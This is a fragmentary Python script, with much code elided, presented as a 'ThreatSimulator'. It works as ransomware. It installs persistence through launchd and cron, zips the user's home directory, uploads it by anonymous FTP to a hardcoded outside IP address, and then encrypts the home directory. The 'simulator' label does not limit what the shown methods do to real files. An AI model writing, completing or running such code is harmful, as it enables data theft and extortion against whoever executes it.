...
BIBLIOTECAS_EXTERNAS = ["cryptography", "requests"]
...
for lib in BIBLIOTECAS_EXTERNAS:
    try:
        ...
        try:
            # Garante que a instalação ocorra no mesmo ambiente em que o script está rodando
            ...
            print(f"[-] Erro crítico ao instalar '{lib}'. Instale manualmente via pip.")
            sys.exit(1)
...
class ThreatSimulator:
    def __init__(self):
        ...
        folders = ["Backup","Documentos","Financeiro"]
    ...
    def add_launchd_persistence(self):
        try:
            ...
            executable = "ARTV"                     # ou caminho absoluto do executável
            cron_schedule = "*/30 * * * *"
            ...
            plist_path = os.path.join(plist_dir, "com.task.plist")
...
"""
            ...
            # ---------- Cron ----------
            #
            cron_entry = f"{cron_schedule} {executable} {script_path}"
    ...
    def upload_via_ftp(self, file_path):
        ftp_url = "ftp://157.230.119.161/upload/"
        username = "anonymous"
        password = ""
    ...
    def simulate_attack(self):
        zip_file_path = self.zip_files(self.home_directory)
        self.upload_via_ftp(zip_file_path)
        self.encrypt_directory(self.home_directory, self.extension)
